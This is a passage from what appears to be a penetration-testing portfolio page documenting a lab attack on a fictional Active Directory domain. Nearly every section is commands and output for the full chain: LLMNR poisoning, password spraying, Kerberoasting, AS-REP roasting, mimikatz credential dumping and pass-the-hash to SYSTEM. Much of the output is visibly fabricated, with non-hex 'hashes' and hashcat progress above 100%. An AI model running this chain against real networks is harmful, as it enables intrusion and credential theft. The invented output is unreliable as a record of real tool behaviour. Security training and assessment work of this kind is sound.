# 🖼️ Evidence & Documentation

<div align="center">

[![Back to Project](https://img.shields.io/badge/←_Back_to_Project-Home-blue?style=for-the-badge)](../README.md)
[![Technical Report](https://img.shields.io/badge/→-Full_Technical_Report-green?style=for-the-badge)](../technical-assessment.md)

</div>

---

## Evidence Repository

Note: Detailed screenshots and command outputs were generated during the lab assessment 
but are not included in this public portfolio version to protect lab environment details. 
In a professional engagement, evidence would include:

- Nmap scan results (XML output)
- Impacket command execution logs
- BloodHound attack path visualizations
- Windows Event Viewer captures
- PowerShell session transcripts
- Hash cracking results

During interviews, I can discuss specific evidence collection and demonstrate 
the technical tools and techniques used in this assessment.

## 🎓 Professional Evidence Documentation Demonstration

*This section demonstrates enterprise penetration testing evidence collection, documentation standards, and professional reporting practices. The examples below illustrate how security findings are structured, documented, and presented in real-world assessments.*

**Portfolio Demonstration:** These examples show proper evidence formatting, command documentation, and technical reporting standards used in professional security engagements.

---

📂 ## Evidence Documentation Examples

*The following examples demonstrate professional evidence formatting and documentation standards used in enterprise penetration testing reports.*

---

## 📋 Evidence Categories

### 🔍 Phase 1: Reconnaissance Evidence

**Network Discovery**
```bash
# Command Executed
sudo nmap -sn 10.50.0.0/22 -oA discovery/ping_sweep

# Results Summary
Starting Nmap scan on 10.50.0.0/22 (1024 hosts)
Nmap scan report for 10.50.1.45
Host is up (0.00021s latency).

Nmap scan report for 10.50.1.78
Host is up (0.00019s latency).

Nmap scan report for 10.50.2.10
Host is up (0.00023s latency).

Nmap scan report for 10.50.2.11
Host is up (0.00024s latency).

Nmap scan report for 10.50.3.50
Host is up (0.00022s latency).

Nmap done: 1024 IP addresses (5 hosts up) scanned in 12.34 seconds
```

**Service Enumeration Evidence**
```bash
# Port Scan Results
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41
443/tcp  open  ssl/http    Apache httpd 2.4.41
3306/tcp open  mysql       MySQL 8.0.26

# SMB Signing Status Check
crackmapexec smb 10.50.0.0/22 --gen-relay-list relay_targets.txt

SMB         10.50.1.78      445    WKSTN-HR-05      Signing: False ⚠️
SMB         10.50.3.50      445    VFS-FS-01        Signing: False ⚠️
SMB         10.50.2.10      445    VFS-DC-01        Signing: True  ✓
SMB         10.50.2.11      445    VFS-DC-02        Signing: True  ✓
```

**Key Finding:** SMB signing not required on 2 out of 5 systems (NTLM relay vulnerability)

---

### 💥 Phase 2: Initial Access Evidence

**Configuration File Discovery**
```bash
# Directory Enumeration
gobuster dir -u http://10.50.1.45 -w wordlist.txt -x php,txt,bak

===============================================================
[+] Url:                     http://10.50.1.45
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Status codes:            200,204,301,302,307,401,403
[+] Extensions:              php,txt,bak
===============================================================

/admin                (Status: 403) [Size: 277]
/uploads              (Status: 200) [Size: 1234]
/api                  (Status: 200) [Size: 891]
/config.php.bak       (Status: 200) [Size: 456] ⚠️ CRITICAL
/backup               (Status: 403) [Size: 277]
```

**Exposed Configuration File Content**
```php
// config.php.bak - EXPOSED CREDENTIALS
<?php
$db_host = "localhost";
$db_user = "webapp_user";
$db_pass = "WebApp2023!Secure";
$db_name = "customer_portal";

// Connection string
$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
?>
```

**Exploitation - SSH Access**
```bash
# Credential Reuse Testing
ssh sysadmin@10.50.1.45
Password: WebApp2023!Secure

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-84-generic x86_64)
Last login: Mon Sep 13 10:23:45 2025 from 10.50.1.150

sysadmin@web-app-01:~$ id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),sudo

sysadmin@web-app-01:~$ whoami
sysadmin

# SUCCESS: Initial access obtained
```

**Database Access Evidence**
```sql
mysql -h 10.50.1.45 -u webapp_user -p'WebApp2023!Secure'

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| customer_portal    |
| mysql              |
+--------------------+

mysql> USE customer_portal;
mysql> SELECT COUNT(*) FROM customers;
+----------+
| COUNT(*) |
+----------+
|     2847 |
+----------+

mysql> SELECT username, email FROM users LIMIT 3;
+-------------+------------------------+
| username    | email                  |
+-------------+------------------------+
| admin       | admin@vanguardfs.com   |
| jsmith      | j.smith@vanguardfs.com |
| mrodriguez  | m.rodriguez@vanguardfs |
+-------------+------------------------+

# RESULT: 2,847 customer records accessible
```

---

### 🔑 Phase 3: Credential Access Evidence

**LLMNR Poisoning - Hash Capture**
```bash
# Responder Execution
sudo responder -I eth0 -wFv

[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 10.50.1.78 for name filesrv01
[*] [LLMNR]  Poisoned answer sent to 10.50.1.78 for name filesrv01
[SMB] NTLMv2-SSP Client   : 10.50.1.78
[SMB] NTLMv2-SSP Username : VANGUARDFS\jthompson
[SMB] NTLMv2-SSP Hash     : jthompson::VANGUARDFS:1122334455667788:8A3D2E9C7F1B4A6D5C8E0F9A7B6C5D4E:0101...

# TIME TO CAPTURE: 12 minutes from Responder start
```

**Hash Cracking Evidence**
```bash
# Hashcat Cracking Session
hashcat -m 5600 captured_hash.txt rockyou.txt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: jthompson::VANGUARDFS:1122334455667788:8A3D...
Time.Started.....: Mon Sep 14 15:23:12 2025 (8 mins, 34 secs)
Time.Estimated...: Mon Sep 14 15:31:46 2025 (0 secs)

Recovered........: 1/1 (100.00%) Digests
Progress.........: 14523456/14344385 (101.25%)
Rejected.........: 0/14523456 (0.00%)

Candidates.#1....: Summer2024! <- CRACKED PASSWORD

# EVIDENCE: Password cracked in 8 minutes 34 seconds
```

**Password Spraying Results**
```bash
# Spray Attempt
crackmapexec smb 10.50.2.11 -u users.txt -p 'Summer2024!' --continue-on-success

SMB         10.50.2.11      445    VFS-DC-02        [+] VANGUARDFS\jthompson:Summer2024! ✓
SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\mrodriguez:Summer2024!
SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\sql_service:Summer2024!
SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\backup_admin:Summer2024!

# Second spray with different pattern
crackmapexec smb 10.50.2.11 -u users.txt -p 'Spring2024!' --continue-on-success

SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\jthompson:Spring2024!
SMB         10.50.2.11      445    VFS-DC-02        [-] VANGUARDFS\mrodriguez:Spring2024!
SMB         10.50.2.11      445    VFS-DC-02        [+] VANGUARDFS\sjenkins:Spring2024! ✓

# SUCCESS RATE: 2/11 users (18%)
```

**Kerberoasting Evidence**
```bash
# Service Ticket Request
impacket-GetUserSPNs corp.vanguardfs.local/jthompson:'Summer2024!' -dc-ip 10.50.2.11 -request

ServicePrincipalName                          Name         MemberOf
--------------------------------------------  -----------  --------
MSSQLSvc/VFS-FS-01.corp.vanguardfs.local:1433 sql_service  CN=Server Operators

$krb5tgs$23$*sql_service$CORP.VANGUARDFS.LOCAL$MSSQLSvc/VFS-FS-01*$a1b2c3d4...

# Hash Cracking
hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Mon Sep 14 16:30:15 2025 (4 mins, 37 secs)

Recovered........: 1/1 (100.00%)
Candidates.#1....: SQLSvc#2024!Backup <- CRACKED

# EVIDENCE: 19-character password cracked in 4 minutes 37 seconds
# REASON: Predictable pattern (ServiceType#Year!Description)
```

**AS-REP Roasting Evidence**
```bash
# AS-REP Hash Request (No pre-auth required)
impacket-GetNPUsers corp.vanguardfs.local/ -dc-ip 10.50.2.11 -usersfile users.txt -format hashcat

$krb5asrep$23$backup_admin@CORP.VANGUARDFS.LOCAL:a8f2c1d5e6f7g8h9...

# Cracking Result
hashcat -m 18200 asrep_hash.txt rockyou.txt

Recovered........: 1/1 (100.00%)
Candidates.#1....: BackupPass2023!

# VULNERABILITY: User has "Do not require Kerberos preauthentication" enabled
```

---

### 🔀 Phase 4: Lateral Movement Evidence

**WinRM Access**
```bash
# Evil-WinRM Connection
evil-winrm -i 10.50.1.78 -u jthompson -p 'Summer2024!'

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jthompson\Documents> whoami
vanguardfs\jthompson

*Evil-WinRM* PS C:\Users\jthompson\Documents> whoami /groups

GROUP INFORMATION
-----------------
Group Name                             Type
====================================== ================
Everyone                               Well-known group
BUILTIN\Remote Desktop Users           Alias
BUILTIN\Users                          Alias
NT AUTHORITY\INTERACTIVE               Well-known group
VANGUARDFS\HR_Managers                 Group
VANGUARDFS\Domain Users                Group

# SUCCESS: WinRM shell on workstation
```

**Mimikatz Credential Dumping**
```powershell
*Evil-WinRM* PS C:\Users\jthompson\Documents> upload mimikatz.exe
*Evil-WinRM* PS C:\Users\jthompson\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 523145 (00000000:0007f9c9)
Session           : Interactive from 1
User Name         : mrodriguez
Domain            : VANGUARDFS
Logon Server      : VFS-DC-02
Logon Time        : 09/13/2025 2:15:23 PM
SID               : S-1-5-21-3842547281-2943729470-1294839502-1104
        msv :
         [00000003] Primary
         * Username : mrodriguez
         * Domain   : VANGUARDFS
         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
         * SHA1     : 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0
        tspkg :
        wdigest :
         * Username : mrodriguez
         * Domain   : VANGUARDFS
         * Password : ITAdmin@2024!

# EVIDENCE: IT Administrator credentials captured from memory
```

**Pass-the-Hash Lateral Movement**
```bash
# Using NTLM Hash for Authentication
crackmapexec smb 10.50.3.50 -u mrodriguez -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'

SMB         10.50.3.50      445    VFS-FS-01        [+] VANGUARDFS\mrodriguez:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)

# Obtaining Shell
impacket-psexec -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 mrodriguez@10.50.3.50

[*] Requesting shares on 10.50.3.50.....
[*] Found writable share ADMIN$
[*] Uploading file mKzKqPOC.exe
[*] Opening SVCManager on 10.50.3.50.....
[*] Creating service XJvN on 10.50.3.50.....
[*] Starting service XJvN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1999]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

# EVIDENCE: SYSTEM-level access on file server via Pass-the-Hash
```

**Sensitive File Discovery**
```bash
# Share Enumeration
smbmap -H 10.50.3.50 -u mrodriguez -p 'ITAdmin@2024!' -R IT_Admin

[+] IP: 10.50.3.50:445  Name: VFS-FS-01
        Disk                     Permissions     Comment
        ----                     -----------     -------
        IT_Admin                 READ, WRITE
        ./IT_Admin
        dr--r--r--                0 Mon Sep 13 14:23:12 2025    .
        dr--r--r--                0 Mon Sep 13 14:23:12 2025    ..
        dr--r--r--                0 Mon Sep 13 13:15:45 2025    Scripts
        -r--r--r--              245 Mon Sep 12 16:42:33 2025    backup_credentials.txt ⚠️
        -r--r--r--             1024 Mon Sep 12 16:45:12 2025    sql_connection.ps1

# Downloaded File Content
cat backup_credentials.txt

SQL Service Account: sql_service
Password: SQLSvc#2024!Backup

Domain Admin Account (Emergency): da_emergency
Password: EmergencyDA!2024

# EVIDENCE: Plaintext credentials stored in file share
```

---

### ⬆️ Phase 5: Privilege Escalation Evidence

**BloodHound Data Collection**
```bash
# Collection
bloodhound-python -u jthompson -p 'Summer2024!' -d corp.vanguardfs.local -dc VFS-DC-02.corp.vanguardfs.local -c All -ns 10.50.2.11

INFO: Found AD domain: corp.vanguardfs.local
INFO: Connecting to LDAP server: VFS-DC-02.corp.vanguardfs.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: VFS-DC-02.corp.vanguardfs.local
INFO: Found 127 users
INFO: Found 58 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Done in 00M
